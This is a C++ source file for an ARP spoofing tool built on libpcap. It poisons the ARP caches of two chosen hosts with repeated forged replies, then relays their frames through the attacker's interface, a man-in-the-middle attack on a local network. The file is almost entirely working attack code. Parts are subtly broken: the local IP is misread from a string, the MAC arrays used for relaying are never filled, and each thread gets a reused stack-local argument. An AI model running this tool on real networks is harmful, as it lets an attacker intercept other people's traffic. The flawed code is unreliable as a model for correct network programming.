#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <signal.h>
#include <errno.h>

#include <net/if.h>
#include <sys/ioctl.h>
#include <netinet/ether.h>
#include <arpa/inet.h>
#include <unistd.h>

#include <pthread.h> // added

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)


void usage() {
	printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
	printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

uint32_t getIPAddress(uint32_t ip_addr, char *device) {
	int sock;
	struct ifreq ifr;
	struct sockaddr_in *sin;
	
	sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock < 0) {
		return 0;
	}
	strcpy(ifr.ifr_name, device);
	if (ioctl(sock, SIOCGIFADDR, &ifr)< 0) {
		close(sock);
		return 0;
	}
	
	sin = (struct sockaddr_in*)&ifr.ifr_addr;
	
	uint32_t ret = *(uint32_t*)inet_ntoa(sin->sin_addr);
	
	close(sock);
	return ret;
}

int getMacAddress(uint8_t *mac, char *device) {
	int sock;
	struct ifreq ifr;	
	char mac_adr[18] = {0,};
			
	sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock < 0) {		
		return 0;
	}	
	
	strcpy(ifr.ifr_name, device);
	if (ioctl(sock, SIOCGIFHWADDR, &ifr)< 0) {
		close(sock);
		return 0;
	}
	
	memcpy(mac, ifr.ifr_hwaddr.sa_data, 6 * sizeof(uint8_t));
	
	close(sock);
	return 1;
}


bool make_packet(pcap_t* handle, EthArpPacket *packet, Mac dmac, Mac smac, Mac sm, uint32_t sip, Mac tm, uint32_t tip, int request) {
	packet->eth_.dmac_ = dmac;
	packet->eth_.smac_ = smac;
	packet->eth_.type_ = htons(EthHdr::Arp);

	packet->arp_.hrd_ = htons(ArpHdr::ETHER);
	packet->arp_.pro_ = htons(EthHdr::Ip4);
	packet->arp_.hln_ = Mac::SIZE;
	packet->arp_.pln_ = Ip::SIZE;
	if(request) packet->arp_.op_ = htons(ArpHdr::Request);
	else packet->arp_.op_ = htons(ArpHdr::Reply);
	packet->arp_.smac_ = sm;
	packet->arp_.sip_ = htonl(Ip(sip));
	packet->arp_.tmac_ = tm;
	packet->arp_.tip_ = htonl(Ip(tip));
	return 1;
}

bool send_packet(pcap_t* handle, EthArpPacket *packet){
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		printf("Error sending packet\n");
		return 0;
	}
	return 1;
}

bool make_send_packet(pcap_t* handle, EthArpPacket *packet, Mac dmac, Mac smac, Mac sm, uint32_t sip, Mac tm, uint32_t tip, int request){
	return make_packet(handle, packet, dmac, smac, sm, sip, tm, tip, request)
	&& send_packet(handle, packet);
}

bool wait_packet(pcap_t* handle, Mac* sm, uint32_t sip, Mac tm, uint32_t tip) {
	struct pcap_pkthdr* header;
	const u_char* packet;
	while (1){
		int res = pcap_next_ex(handle, &header, &packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			printf("Error receiving packet\n");
			return 0;
		}
		
		EthArpPacket* cpkt = (EthArpPacket*)packet;
		
		if (ntohs(cpkt->arp_.op_) == ArpHdr::Reply && ntohl(cpkt->arp_.sip_) == sip && ntohl(cpkt->arp_.tip_) == tip && memcmp(((uint8_t*)(cpkt->arp_.tmac_)), ((uint8_t*)tm), 6) == 0){
			*sm = Mac(cpkt->arp_.smac_);
			break;
		}
	}
	return 1;
}

bool find_mac(pcap_t* handle, EthArpPacket *packet, Mac dmac, Mac smac, Mac sm, uint32_t sip, Mac tm, uint32_t tip, Mac* dest_mac, int request) {
	return make_send_packet(handle, packet, dmac, smac, sm, sip, tm, tip, request) && wait_packet(handle, dest_mac, tip, sm, sip);
}

void macprint(Mac target_mac) {
	for (int i = 0; i < 6; i++){
		printf("%02X", ((uint8_t*)target_mac)[i]);
		if (i == 5)
			printf("\n");
		else
			printf(":");
	}
}

typedef struct arg{
	pcap_t *handle;
	EthArpPacket *packet;
	Mac sender_mac;
	Mac target_mac;
	uint32_t sender;
	uint32_t target;
	Mac my_mac;
	int again;
}arg;

bool arp_cache_poison(void *t_void){
	arg *t = (arg*)t_void;
	while(true){
		bool res = make_send_packet(t->handle, t->packet, t->sender_mac, t->my_mac, t->my_mac, t->target, t->sender_mac, t->sender, 0)
	&& make_send_packet(t->handle, t->packet, t->target_mac, t->my_mac, t->my_mac, t->sender, t->target_mac, t->target, 0);
		
		if(t->again == -1 || res == false)
			return res;
		sleep(t->again);
	}
}

int main(int argc, char* argv[]) {
	if (argc <= 2 || argc & 1) {
		usage();
		return -1;
	}

	char* device = argv[1];
	
	if (strlen(device) >= 32){
		printf("Too long device name.");
		return -1;
	}
	

	
	
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(device, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", device, errbuf);
		return -1;
	}
	EthArpPacket packet;
	

	
	uint8_t mac[6];
	uint32_t ip;
	Mac my_mac;
	
	ip = getIPAddress(ip, device);
	getMacAddress(mac, device);

	
	my_mac = Mac(mac);
	
	Mac mac_ff = Mac("FF:FF:FF:FF:FF:FF");
	Mac mac_00 = Mac("00:00:00:00:00:00");
	
	int req = (argc - 2) / 2;
	
	
	uint32_t sender_ips[5000];
	uint32_t target_ips[5000];
	Mac sender_macs[5000];
	Mac target_macs[5000];
	
	printf("ARP cache poisoning start... \n");
	
	for(int i = 0; i < req; i++) {
		uint32_t sender = Ip(argv[2 * i + 2]);
		uint32_t target = Ip(argv[2 * i + 3]);
		
		sender_ips[i] = sender;
		target_ips[i] = target;
		
		Mac sender_mac;
		Mac target_mac;
		
		printf("SENDER IP: %s\n", argv[2 * i + 2]);
		printf("TARGET IP: %s\n", argv[2 * i + 3]);

		if (!find_mac(handle, &packet, mac_ff, my_mac, my_mac, ip, mac_00, target, &target_mac, 1)){
			printf("Finding TARGET MAC fail.");
			return -1;
		}	
		printf("TARGET MAC: ");
		macprint(target_mac);
		
		if (!find_mac(handle, &packet, mac_ff, my_mac, my_mac, ip, mac_00, sender, &sender_mac, 1)){
			printf("Finding SENDER MAC fail.");
			return -1;
		}
		printf("SENDER MAC: ");
		macprint(sender_mac);
		
		// eon7500.tistory.com/43
		arg t = {handle, &packet, sender_mac, target_mac, sender, target, my_mac, 10};
		pthread_t th;
		
		if(pthread_create(&th, NULL, (void* (*)(void*))arp_cache_poison, (void *)(&t))){
			printf("Setting repeating cache poisoning failed.");
			return -1;
		}
		printf("Success!\n\n");
	}
	printf("Complete!\n\n");
	
	printf("ARP spoofing start... \n");
	struct pcap_pkthdr* header;
	const u_char* pkt;
	while(1) {
		int res = pcap_next_ex(handle, &header, &pkt);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("Terminated.\n");
			return 0;
		}
		EthArpPacket* packet = (EthArpPacket*)pkt;
		if(ntohs(packet->eth_.type_) == EthHdr::Arp) {
			for(int i = 0; i < req; i++) {
				if((ntohl(packet->arp_.tip_) != sender_ips[i]) && (ntohl(packet->arp_.tip_) != target_ips[i]))
					continue;	
				
				arg t = {handle, packet, sender_macs[i], target_macs[i], sender_ips[i], target_ips[i], my_mac, -1};
				if(!(arp_cache_poison(&t))){
					printf("Error during checking.\n");
					return -1;
				}
			}
		}
		else if(packet->eth_.dmac_ == my_mac){
			for(int i = 0; i < req; i++) {
				if((packet->eth_.smac_ == target_macs[i]) &&  (ntohl(*((uint32_t *)((uint8_t *)packet + 30))) == sender_ips[i])) {
					packet->eth_.dmac_ = sender_macs[i];
					packet->eth_.smac_ = my_mac;
				}
				else if(packet->eth_.smac_ == sender_macs[i]) {
					packet->eth_.dmac_ = target_macs[i];
					packet->eth_.smac_ = my_mac;
				}
				else
					continue;
				if(!(send_packet(handle, packet))){
					printf("Error during relaying.\n");
					return -1;
				}
			}
		}
	}
}
